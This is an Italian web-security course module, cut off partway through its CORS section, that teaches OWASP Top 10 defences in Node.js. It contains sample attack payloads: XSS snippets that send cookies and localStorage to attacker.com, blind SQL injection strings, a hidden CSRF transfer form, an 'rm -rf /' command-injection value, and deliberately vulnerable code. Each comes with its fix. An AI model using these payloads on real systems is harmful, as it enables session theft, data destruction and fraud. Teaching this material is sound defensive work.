---
corso: "Sviluppo Web"
fase: "5 — Sicurezza"
modulo: "14"
titolo: "Sicurezza Web"
versione: "OWASP Top 10 2021 / CSP Level 3 / SRI"
livello: "Intermedio-Avanzato"
prerequisiti:
  - "04 — JavaScript Fondamenti"
  - "10 — Node.js"
obiettivi:
  - "Prevenire XSS, CSRF, injection e OWASP Top 10"
  - "Configurare Content Security Policy (CSP) e security headers"
  - "Implementare input validation e output encoding"
  - "Gestire CORS in modo sicuro"
  - "Proteggere API con rate limiting e abuse prevention"
  - "Eseguire security audit con strumenti automatizzati"
tag: [sicurezza-web, OWASP, XSS, CSRF, CSP, CORS, injection, security-headers]
---

# Sicurezza Web

> **Modulo 14** · **Aggiornamento:** 2026-05-24

> ### Obiettivi di apprendimento
>
> **Prerequisiti:** [JavaScript Fondamenti](04-javascript-fondamenti.md), [Node.js](10-nodejs.md)
>
> Al termine di questo modulo saprai:
> 1. Prevenire XSS, CSRF, injection e le vulnerabilita OWASP Top 10
> 2. Configurare Content Security Policy (CSP) e security headers
> 3. Implementare input validation e output encoding
> 4. Gestire CORS in modo sicuro
> 5. Proteggere API con rate limiting e abuse prevention
> 6. Eseguire security audit con strumenti automatizzati
>
> **Tempo stimato:** 6-8 ore · **Livello:** Intermedio-Avanzato

## Idee guida
1. **CSP nonce > `'unsafe-inline'`.** XSS mitigation effettiva.
2. **OWASP Top 10 2023: Broken Access Control numero 1.**
3. **Helmet middleware Node.js: 15 security headers default.**
4. **CORP/COEP per Spectre isolation.** Cross-origin protection.
5. **Subresource Integrity (SRI) per CDN script.**


## Panoramica

La sicurezza web non rappresenta una funzionalità accessoria da aggiungere al termine dello sviluppo, ma un requisito architetturale fondamentale che permea ogni livello dell'applicazione — dal frontend al backend, dal database all'infrastruttura di deployment. Una singola vulnerabilità può compromettere l'intero sistema, esporre dati sensibili degli utenti e generare sanzioni legali severe sotto normative come il GDPR.

Il panorama delle minacce evolve costantemente. Gli attaccanti automatizzano le scansioni di vulnerabilità, sfruttano le supply chain per iniettare codice malevolo nelle dipendenze, e combinano social engineering con exploit tecnici. Comprendere le vulnerabilità più comuni e le relative contromisure è una responsabilità professionale di ogni sviluppatore web.

### OWASP Top 10 — 2021

L'OWASP (Open Web Application Security Project) pubblica periodicamente una classifica delle dieci vulnerabilità più critiche nelle applicazioni web. La versione 2021 riflette i cambiamenti nel panorama della sicurezza:

| Posizione | Categoria | Descrizione |
|-----------|-----------|-------------|
| A01 | Broken Access Control | Violazione dei controlli di accesso, permette agli utenti di agire al di fuori dei propri permessi |
| A02 | Cryptographic Failures | Fallimenti crittografici che espongono dati sensibili (precedentemente "Sensitive Data Exposure") |
| A03 | Injection | Iniezione di codice malevolo (SQL, NoSQL, OS command, LDAP) |
| A04 | Insecure Design | Difetti architetturali e di progettazione, non risolvibili con implementazione perfetta |
| A05 | Security Misconfiguration | Configurazioni di sicurezza mancanti, incomplete o errate |
| A06 | Vulnerable and Outdated Components | Uso di componenti con vulnerabilità note o non più supportati |
| A07 | Identification and Authentication Failures | Fallimenti nell'identificazione e autenticazione degli utenti |
| A08 | Software and Data Integrity Failures | Assunzioni non verificate sull'integrità del software e dei dati |
| A09 | Security Logging and Monitoring Failures | Logging e monitoraggio insufficienti che impediscono la rilevazione di attacchi |
| A10 | Server-Side Request Forgery (SSRF) | Il server viene indotto a effettuare richieste verso destinazioni non previste |

Questa guida analizza ciascuna categoria in profondità, fornendo esempi pratici di attacco, strategie di prevenzione e implementazioni concrete in JavaScript e Node.js.

---

## Cross-Site Scripting (XSS)

Il Cross-Site Scripting è una delle vulnerabilità più diffuse e pericolose nel web. Consente a un attaccante di iniettare script malevoli nelle pagine visualizzate da altri utenti, ottenendo potenzialmente accesso ai cookie di sessione, ai dati personali e alla capacità di compiere azioni per conto della vittima.

### Stored XSS

Lo Stored XSS (o Persistent XSS) è la variante più pericolosa. Il payload malevolo viene salvato permanentemente nel database dell'applicazione e servito a ogni utente che accede alla risorsa compromessa.

```javascript
// Scenario di attacco — un commento in un blog
// L'attaccante inserisce come commento:
const maliciousComment = `
  Ottimo articolo!
  <script>
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: window.location.href
      })
    });
  </script>
`;

// Se il server salva il commento senza sanitizzazione
// e il frontend lo renderizza con innerHTML:
commentDiv.innerHTML = comment.body; // VULNERABILE

// Ogni utente che visualizza il commento esegue lo script
```

### Reflected XSS

Il Reflected XSS si verifica quando l'input dell'utente viene immediatamente incluso nella risposta del server senza essere salvato. L'attacco richiede che la vittima clicchi su un link appositamente costruito.

```javascript
// URL malevolo inviato alla vittima:
// https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// Server vulnerabile (Express)
app.get('/search', (req, res) => {
  const query = req.query.q;
  // Inserimento diretto nella risposta HTML — VULNERABILE
  res.send(`
    <h1>Risultati per: ${query}</h1>
    <p>Nessun risultato trovato.</p>
  `);
});
```

### DOM-Based XSS

Il DOM-Based XSS avviene interamente nel browser, senza coinvolgere il server. Il codice JavaScript del client legge dati da una sorgente controllata dall'attaccante (URL, `location.hash`, `postMessage`) e li inserisce nel DOM in modo non sicuro.

```javascript
// Codice vulnerabile nel frontend
const userInput = window.location.hash.substring(1);
document.getElementById('greeting').innerHTML = `Benvenuto, ${userInput}!`;

// URL malevolo:
// https://example.com/page#<img src=x onerror=alert(document.cookie)>

// Altro esempio con document.write
const name = new URLSearchParams(window.location.search).get('name');
document.write(`<h1>Ciao ${name}</h1>`); // VULNERABILE
```

### Prevenzione XSS

La prevenzione XSS richiede una strategia multilivello che combina diverse tecniche complementari.

**Output Encoding** — la difesa primaria consiste nell'eseguire l'encoding dell'output in base al contesto in cui viene inserito:

```javascript
// Libreria di encoding per diversi contesti
function encodeForHTML(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

function encodeForAttribute(str) {
  return str.replace(/[^a-zA-Z0-9,._-]/g, char => {
    const hex = char.charCodeAt(0).toString(16);
    return `&#x${hex};`;
  });
}

function encodeForJavaScript(str) {
  return str.replace(/[^a-zA-Z0-9,._]/g, char => {
    const hex = char.charCodeAt(0).toString(16).padStart(4, '0');
    return `\\u${hex}`;
  });
}

// Utilizzo sicuro nel server
app.get('/search', (req, res) => {
  const safeQuery = encodeForHTML(req.query.q);
  res.send(`<h1>Risultati per: ${safeQuery}</h1>`);
});
```

**Content Security Policy (CSP)** — una CSP ben configurata impedisce l'esecuzione di script inline e limita le origini autorizzate:

```javascript
// Header CSP rigorosa
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'nonce-${generateNonce()}'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self' https://api.example.com",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '));
  next();
});
```

**DOMPurify** — per sanitizzare HTML generato dagli utenti (ad esempio in editor rich-text):

```javascript
import DOMPurify from 'dompurify';

// Sanitizzazione base
const cleanHTML = DOMPurify.sanitize(dirtyHTML);

// Configurazione personalizzata
const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title', 'target'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['script', 'style', 'iframe', 'form', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
});

// Hook per modificare il comportamento
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
```

**React auto-escaping** — React esegue automaticamente l'escaping di tutti i valori inseriti in JSX, ma esistono trappole da evitare:

```jsx
// Sicuro — React esegue l'escape automaticamente
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>; // <script> diventa testo visibile
}

// PERICOLOSO — dangerouslySetInnerHTML bypassa la protezione
function UnsafeComponent({ userHTML }) {
  return <div dangerouslySetInnerHTML={{ __html: userHTML }} />; // VULNERABILE
}

// Se necessario usare dangerouslySetInnerHTML, sanitizzare con DOMPurify
function SafeRichComponent({ userHTML }) {
  const sanitized = DOMPurify.sanitize(userHTML);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Attenzione anche agli href dinamici
function LinkComponent({ url }) {
  // VULNERABILE se url = "javascript:alert('XSS')"
  return <a href={url}>Clicca</a>;
}

// Versione sicura con validazione del protocollo
function SafeLinkComponent({ url }) {
  const safeUrl = url.match(/^https?:\/\//) ? url : '#';
  return <a href={safeUrl}>Clicca</a>;
}
```

---

## SQL Injection

La SQL Injection è una delle vulnerabilità più antiche e devastanti. Consente a un attaccante di manipolare le query SQL dell'applicazione, ottenendo accesso non autorizzato ai dati, modificando o eliminando record, e in alcuni casi eseguendo comandi sul sistema operativo.

### Classic SQL Injection

```javascript
// Codice vulnerabile — concatenazione di stringhe nella query
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // MAI fare questo — VULNERABILE
  const query = `SELECT * FROM users
                 WHERE username = '${username}'
                 AND password = '${password}'`;

  const result = await db.query(query);

  // Input dell'attaccante:
  // username: admin' --
  // password: qualsiasi

  // Query risultante:
  // SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualsiasi'
  // Il commento SQL (--) elimina il controllo della password
});

// Esempio di estrazione dati con UNION
// Input: ' UNION SELECT username, password, null FROM admin_users --
// Combina i risultati della query originale con i dati della tabella admin
```

### Blind SQL Injection

Nella Blind SQL Injection l'attaccante non vede direttamente i risultati della query, ma può inferire informazioni osservando il comportamento dell'applicazione (risposte diverse, tempi di risposta).

```sql
-- Boolean-based blind SQLi
-- L'attaccante determina se la prima lettera del nome del database è 'a'
' AND (SELECT SUBSTRING(database(),1,1)) = 'a' --

-- Time-based blind SQLi
-- Se la condizione è vera, il server attende 5 secondi prima di rispondere
' AND IF(1=1, SLEEP(5), 0) --

-- L'attaccante estrae informazioni un carattere alla volta
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(3), 0) --
```

### Prevenzione SQL Injection

**Parameterized Queries (Prepared Statements)** — la difesa fondamentale:

```javascript
// PostgreSQL con node-postgres — query parametrizzate
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // I parametri vengono gestiti separatamente dalla query
  const query = 'SELECT * FROM users WHERE username = $1 AND password_hash = $2';
  const values = [username, hashPassword(password)];

  const result = await pool.query(query, values);
  // L'input dell'attaccante viene trattato come stringa letterale
  // Non può alterare la struttura della query
});

// MySQL con mysql2 — prepared statements
const [rows] = await connection.execute(
  'SELECT * FROM products WHERE category = ? AND price < ?',
  [category, maxPrice]
);

// SQLite con better-sqlite3
const stmt = db.prepare('SELECT * FROM users WHERE id = ?');
const user = stmt.get(userId);
```

**ORM (Object-Relational Mapping)** — un livello di astrazione che genera query parametrizzate:

```javascript
// Prisma — query sicure per design
const user = await prisma.user.findUnique({
  where: { username: userInput }  // automaticamente parametrizzato
});

const products = await prisma.product.findMany({
  where: {
    category: categoryInput,
    price: { lte: parseFloat(maxPriceInput) }
  }
});

// ATTENZIONE: anche con gli ORM, le raw query sono pericolose
// VULNERABILE se si usa $queryRawUnsafe
const result = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE name = '${userInput}'`
);

// SICURO con $queryRaw e template tagged
const result = await prisma.$queryRaw`
  SELECT * FROM users WHERE name = ${userInput}
`;
```

**Input Validation** — una difesa supplementare (mai l'unica):

```javascript
import Joi from 'joi';

const loginSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  password: Joi.string().min(8).max(128).required()
});

app.post('/login', async (req, res) => {
  const { error, value } = loginSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: 'Input non valido' });
  }
  // Procedere con query parametrizzate
});
```

---

## Cross-Site Request Forgery (CSRF)

Il CSRF sfrutta la fiducia che un sito web ripone nel browser dell'utente. Quando un utente è autenticato su un sito, il browser include automaticamente i cookie di sessione in ogni richiesta verso quel dominio. Un attaccante può indurre la vittima a effettuare richieste non desiderate semplicemente facendole visitare una pagina malevola.

### Meccanismo di Attacco

```html
<!-- Pagina malevola ospitata su attacker.com -->
<!-- L'utente è autenticato su bank.com -->

<!-- Attacco con form nascosto — POST request -->
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account" />
    <input type="hidden" name="amount" value="10000" />
  </form>
</body>

<!-- Attacco con immagine — GET request (se l'endpoint accetta GET) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none" />

<!-- Attacco con fetch (richiede CORS permissivo sul target) -->
<script>
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: 'attacker', amount: 10000 })
  });
</script>
```

### Prevenzione CSRF

**CSRF Tokens** — un token unico e imprevedibile associato alla sessione dell'utente:

```javascript
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
const csrfProtection = csrf({ cookie: true });

// Il middleware genera un token univoco per ogni sessione
app.get('/form', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// Il token viene verificato automaticamente nelle richieste POST
app.post('/transfer', csrfProtection, (req, res) => {
  // Se il token non corrisponde, la richiesta viene rifiutata con 403
  processTransfer(req.body);
});
```

```html
<!-- Nel template HTML -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input type="text" name="to" />
  <input type="number" name="amount" />
  <button type="submit">Trasferisci</button>
</form>
```

**SameSite Cookies** — la difesa moderna più efficace:

```javascript
// Configurazione dei cookie di sessione con SameSite
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,       // non accessibile da JavaScript
    secure: true,         // solo HTTPS
    sameSite: 'strict',   // non inviato in richieste cross-site
    maxAge: 3600000,      // 1 ora
    domain: '.example.com',
    path: '/'
  }
}));

// sameSite: 'strict'  — il cookie non viene mai inviato nelle richieste cross-site
//                        (anche cliccando un link da un altro sito)
// sameSite: 'lax'     — il cookie viene inviato nelle navigazioni top-level GET
//                        (cliccando un link sì, ma form POST o iframe no)
// sameSite: 'none'    — il cookie viene sempre inviato (richiede secure: true)
```

**Double Submit Cookie Pattern** — un'alternativa stateless ai CSRF token:

```javascript
import crypto from 'crypto';

// Middleware che genera e verifica il double submit cookie
function doubleSubmitCsrf(req, res, next) {
  if (req.method === 'GET') {
    // Genera un token casuale e lo invia come cookie
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf-token', token, {
      httpOnly: false,   // il JavaScript deve poterlo leggere
      secure: true,
      sameSite: 'strict'
    });
    return next();
  }

  // Per le richieste di modifica, verifica che il token nell'header
  // corrisponda a quello nel cookie
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token non valido' });
  }
  next();
}

// Il client include il token nell'header di ogni richiesta
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: { 'X-CSRF-Token': getCookie('csrf-token') },
//   body: JSON.stringify(data)
// });
```

---

## Injection Attacks

Oltre alla SQL Injection, esistono numerose varianti di attacchi injection che colpiscono diversi sistemi di backend.

### NoSQL Injection

I database NoSQL come MongoDB non sono immuni dalle injection. La struttura basata su oggetti JSON introduce vulnerabilità specifiche.

```javascript
// Codice vulnerabile con MongoDB
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Se l'attaccante invia: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  // la query restituisce il primo utente nel database
  const user = await db.collection('users').findOne({
    username: username,   // VULNERABILE se non validato
    password: password
  });
});

// PREVENZIONE: validare esplicitamente i tipi di input
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Verifica che i valori siano stringhe
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Input non valido' });
  }

  // Utilizzo di mongo-sanitize per rimuovere operatori
  const sanitizedUsername = mongoSanitize(username);
  const user = await db.collection('users').findOne({
    username: sanitizedUsername,
    password_hash: hashPassword(password)
  });
});
```

### Command Injection

Si verifica quando l'applicazione esegue comandi di sistema operativo con input non sanitizzato dall'utente.

```javascript
// VULNERABILE — esecuzione diretta dell'input utente
const { exec } = require('child_process');

app.get('/dns-lookup', (req, res) => {
  const domain = req.query.domain;
  // Input malevolo: example.com; rm -rf /
  exec(`nslookup ${domain}`, (error, stdout) => {
    res.send(stdout);
  });
});

// SICURO — utilizzare execFile con argomenti separati
const { execFile } = require('child_process');

app.get('/dns-lookup', (req, res) => {
  const domain = req.query.domain;

  // Validazione rigorosa dell'input
  if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
    return res.status(400).json({ error: 'Dominio non valido' });
  }

  // execFile non invoca la shell — i metacaratteri vengono ignorati
  execFile('nslookup', [domain], (error, stdout) => {
    res.send(stdout);
  });
});
```

### LDAP Injection

Colpisce le applicazioni che utilizzano query LDAP per l'autenticazione o la ricerca di utenti.

```javascript
// VULNERABILE
const filter = `(&(uid=${username})(userPassword=${password}))`;
// Input: username = "*)(uid=*))(|(uid=*"
// Risultato: (&(uid=*)(uid=*))(|(uid=*)(userPassword=qualsiasi))

// SICURO — escape dei caratteri speciali LDAP
function escapeLDAP(str) {
  return str.replace(/[\\*()\\x00]/g, char => {
    return '\\' + char.charCodeAt(0).toString(16).padStart(2, '0');
  });
}

const safeFilter = `(&(uid=${escapeLDAP(username)})(userPassword=${escapeLDAP(password)}))`;
```

### Strategia di Prevenzione Universale

La prevenzione contro tutti i tipi di injection segue principi comuni:

```javascript
// 1. Validazione rigorosa dell'input con schema
import Joi from 'joi';

const schemas = {
  search: Joi.object({
    query: Joi.string().max(200).pattern(/^[a-zA-Z0-9\s\-_]+$/),
    page: Joi.number().integer().min(1).max(1000),
    limit: Joi.number().integer().min(1).max(100)
  }),

  userUpdate: Joi.object({
    name: Joi.string().min(1).max(100).trim(),
    email: Joi.string().email().max(254),
    role: Joi.string().valid('user', 'editor', 'admin')
  })
};

// 2. Middleware di validazione generico
function validate(schemaName) {
  return (req, res, next) => {
    const { error, value } = schemas[schemaName].validate(req.body, {
      abortEarly: false,
      stripUnknown: true  // rimuove campi non definiti nello schema
    });
    if (error) {
      return res.status(400).json({
        error: 'Validazione fallita',
        details: error.details.map(d => d.message)
      });
    }
    req.body = value; // sostituisce con i valori validati e sanitizzati
    next();
  };
}

// 3. Applicazione sistematica
app.put('/api/users/:id', validate('userUpdate'), updateUserHandler);
```

---

## Broken Authentication

I fallimenti nell'autenticazione sono tra le vulnerabilità più sfruttate, poiché forniscono un accesso diretto agli account degli utenti e, di conseguenza, ai loro dati e privilegi.

### Credential Stuffing

Il credential stuffing sfrutta il fatto che molti utenti riutilizzano le stesse credenziali su più servizi. Gli attaccanti utilizzano enormi database di credenziali rubate in precedenti data breach per tentare l'accesso automatizzato.

```javascript
// Simulazione di un attacco di credential stuffing
// L'attaccante testa migliaia di combinazioni username/password
// ottenute da breach di altri servizi

// PREVENZIONE: rilevamento di credential stuffing
import { RateLimiterMemory } from 'rate-limiter-flexible';

// Rate limiter per IP
const limiterByIP = new RateLimiterMemory({
  points: 10,        // massimo 10 tentativi
  duration: 60 * 15  // in una finestra di 15 minuti
});

// Rate limiter per username (protegge singoli account)
const limiterByUsername = new RateLimiterMemory({
  points: 5,         // massimo 5 tentativi
  duration: 60 * 60  // in un'ora
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    // Verifica entrambi i rate limiter
    await limiterByIP.consume(req.ip);
    await limiterByUsername.consume(username);
  } catch (rateLimiterRes) {
    const retryAfter = Math.ceil(rateLimiterRes.msBeforeNext / 1000);
    res.set('Retry-After', retryAfter);
    return res.status(429).json({
      error: 'Troppi tentativi di accesso. Riprova più tardi.'
    });
  }

  // Procedere con l'autenticazione
  const user = await authenticateUser(username, password);

  if (!user) {
    // Messaggio generico — non rivelare se l'utente esiste
    return res.status(401).json({
      error: 'Credenziali non valide'
    });
  }

  // Reset del rate limiter dopo un login riuscito
  await limiterByUsername.delete(username);

  // Generare sessione/token
});
```

### Brute Force

L'attacco brute force tenta sistematicamente tutte le possibili combinazioni di password. La difesa combina rate limiting con politiche di lockout progressive.

```javascript
// Account lockout progressivo
async function recordFailedAttempt(db, userId) {
  const account = await db.query(
    'UPDATE users SET failed_attempts = failed_attempts + 1, last_failed_at = NOW() WHERE id = $1 RETURNING failed_attempts',
    [userId]
  );

  const attempts = account.rows[0].failed_attempts;

  // Lockout progressivo — durata crescente
  let lockDuration = 0;
  if (attempts >= 10) lockDuration = 60 * 60;       // 1 ora dopo 10 tentativi
  else if (attempts >= 5) lockDuration = 60 * 15;   // 15 min dopo 5 tentativi
  else if (attempts >= 3) lockDuration = 60;         // 1 min dopo 3 tentativi

  if (lockDuration > 0) {
    const lockUntil = new Date(Date.now() + lockDuration * 1000);
    await db.query(
      'UPDATE users SET locked_until = $1 WHERE id = $2',
      [lockUntil, userId]
    );
  }
}
```

### Multi-Factor Authentication (MFA)

L'implementazione di MFA con TOTP (Time-based One-Time Password) aggiunge un livello di sicurezza significativo:

```javascript
import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

// Generazione del segreto per l'utente
app.post('/mfa/setup', authenticate, async (req, res) => {
  const secret = speakeasy.generateSecret({
    name: `MyApp (${req.user.email})`,
    issuer: 'MyApp'
  });

  // Salvare il segreto temporaneamente (non ancora verificato)
  await db.query(
    'UPDATE users SET mfa_temp_secret = $1 WHERE id = $2',
    [secret.base32, req.user.id]
  );

  // Generare il QR code per l'app authenticator
  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);

  res.json({
    qrCode: qrCodeUrl,
    manualKey: secret.base32  // per inserimento manuale
  });
});

// Verifica e attivazione del MFA
app.post('/mfa/verify', authenticate, async (req, res) => {
  const { token } = req.body;
  const user = await getUser(req.user.id);

  const isValid = speakeasy.totp.verify({
    secret: user.mfa_temp_secret,
    encoding: 'base32',
    token: token,
    window: 1  // accetta token del periodo precedente e successivo
  });

  if (isValid) {
    await db.query(
      'UPDATE users SET mfa_secret = mfa_temp_secret, mfa_enabled = true, mfa_temp_secret = NULL WHERE id = $1',
      [req.user.id]
    );

    // Generare codici di backup
    const backupCodes = Array.from({ length: 10 }, () =>
      crypto.randomBytes(4).toString('hex')
    );
    await saveBackupCodes(req.user.id, backupCodes);

    res.json({ success: true, backupCodes });
  } else {
    res.status(400).json({ error: 'Codice non valido' });
  }
});

// Login con MFA
app.post('/login', async (req, res) => {
  const { username, password, mfaToken } = req.body;

  const user = await authenticateCredentials(username, password);
  if (!user) return res.status(401).json({ error: 'Credenziali non valide' });

  if (user.mfa_enabled) {
    if (!mfaToken) {
      return res.status(200).json({ requiresMFA: true });
    }

    const mfaValid = speakeasy.totp.verify({
      secret: user.mfa_secret,
      encoding: 'base32',
      token: mfaToken,
      window: 1
    });

    if (!mfaValid) {
      return res.status(401).json({ error: 'Codice MFA non valido' });
    }
  }

  // Autenticazione completata — creare sessione
  const token = generateJWT(user);
  res.json({ token });
});
```

---

## Security Headers

Gli header HTTP di sicurezza rappresentano una linea di difesa essenziale che opera a livello di protocollo. Una configurazione appropriata mitiga intere classi di attacchi senza richiedere modifiche al codice applicativo.

### Content Security Policy (CSP)

La CSP è il meccanismo più potente per mitigare attacchi XSS e data injection. Definisce una whitelist di sorgenti autorizzate per ogni tipo di risorsa.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com wss://ws.example.com;
  media-src 'self';
  object-src 'none';
  frame-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri /csp-report;
```

Le direttive principali:

- **default-src** — fallback per tutte le direttive non specificate esplicitamente.
- **script-src** — sorgenti autorizzate per gli script. Evitare `'unsafe-inline'` e `'unsafe-eval'`; preferire i nonce.
- **style-src** — sorgenti per i fogli di stile. `'unsafe-inline'` è spesso necessario per CSS-in-JS.
- **img-src** — sorgenti per le immagini. `data:` consente immagini inline base64.
- **connect-src** — endpoint per fetch, XMLHttpRequest, WebSocket ed EventSource.
- **frame-ancestors** — equivalente moderno di X-Frame-Options. `'none'` impedisce l'embedding in iframe.
- **upgrade-insecure-requests** — converte automaticamente le richieste HTTP in HTTPS.
- **report-uri** / **report-to** — endpoint per la segnalazione di violazioni CSP.

### Configurazione Completa con helmet.js

Il pacchetto `helmet` configura automaticamente tutti gli header di sicurezza raccomandati per le applicazioni Express:

```javascript
import helmet from 'helmet';
import crypto from 'crypto';

app.use((req, res, next) => {
  // Generare un nonce univoco per ogni richiesta
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`
      ],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: []
    },
    reportOnly: false
  },

  // HTTP Strict Transport Security
  // Forza l'uso di HTTPS per il dominio e tutti i sottodomini
  strictTransportSecurity: {
    maxAge: 63072000,       // 2 anni in secondi
    includeSubDomains: true,
    preload: true           // inclusione nella lista preload dei browser
  },

  // Impedisce il MIME-type sniffing del browser
  xContentTypeOptions: true,  // X-Content-Type-Options: nosniff

  // Impedisce l'embedding in iframe (protezione clickjacking)
  frameguard: {
    action: 'deny'  // X-Frame-Options: DENY
  },

  // Controlla le informazioni inviate nell'header Referer
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
    // Invia l'origine completa per richieste same-origin
    // Solo l'origine (senza path) per richieste cross-origin sicure
    // Nessun referer per downgrade HTTPS → HTTP
  },

  // Disabilita l'header X-Powered-By (Express lo imposta di default)
  hidePoweredBy: true,

  // Impedisce il download di risorse in contesti non sicuri
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-origin' },

  // Previene attacchi DNS rebinding
  dnsPrefetchControl: { allow: false },

  // Disabilita la cache per contenuti sensibili
  noCache: false,  // normalmente gestito caso per caso

  // Permissions Policy (precedentemente Feature-Policy)
  // Non incluso direttamente in helmet, da aggiungere manualmente
}));

// Permissions Policy — controlla l'accesso alle API del browser
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', [
    'camera=()',            // disabilita la fotocamera
    'microphone=()',        // disabilita il microfono
    'geolocation=(self)',   // geolocalizzazione solo per il dominio corrente
    'payment=(self)',       // API di pagamento solo per il dominio corrente
    'usb=()',               // disabilita l'accesso USB
    'magnetometer=()',      // disabilita il magnetometro
    'gyroscope=()',         // disabilita il giroscopio
    'accelerometer=()',     // disabilita l'accelerometro
    'autoplay=(self)',      // autoplay solo per il dominio corrente
    'fullscreen=(self)',    // fullscreen solo per il dominio corrente
    'picture-in-picture=(self)'
  ].join(', '));
  next();
});
```

---

## CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy

La Same-Origin Policy (SOP) è un meccanismo di sicurezza fondamentale dei browser. Impedisce a uno script caricato da un'origine di interagire con risorse di un'altra origine. Due URL hanno la stessa origine solo se condividono protocollo, host e porta.

```
https://example.com:443/page     — origine: https://example.com
https://example.com:443/other    — STESSA origine (path diverso, ma ok)
http://example.com:443/page      — DIVERSA origine (protocollo diverso)
https://api.example.com/page     — DIVERSA origine (host diverso)
https://example.com:8080/page    — DIVERSA origine (porta diversa)
```

La SOP blocca le richieste cross-origin da JavaScript (fetch, XMLHttpRequest), ma non quelle iniziate da tag come `<img>`, `<script>` e `<link>`. CORS permette al server di autorizzare esplicitamente richieste cross-origin.

### CORS Headers

I principali header CORS che il server include nelle risposte:

```
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization, X-Request-ID
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
Access-Control-Expose-Headers: X-Total-Count, X-Request-ID
```

### Preflight Requests

Le richieste "non semplici" (che usano metodi diversi da GET/HEAD/POST, header personalizzati o Content-Type diversi da quelli standard) attivano una richiesta preflight OPTIONS prima della richiesta effettiva:

```
Browser → Server:  OPTIONS /api/data
                   Origin: https://frontend.example.com
                   Access-Control-Request-Method: PUT
                   Access-Control-Request-Headers: Content-Type, Authorization

Server → Browser:  200 OK
                   Access-Control-Allow-Origin: https://frontend.example.com
                   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
                   Access-Control-Allow-Headers: Content-Type, Authorization
                   Access-Control-Max-Age: 86400

// Solo dopo la risposta positiva al preflight, il browser invia la richiesta effettiva
Browser → Server:  PUT /api/data
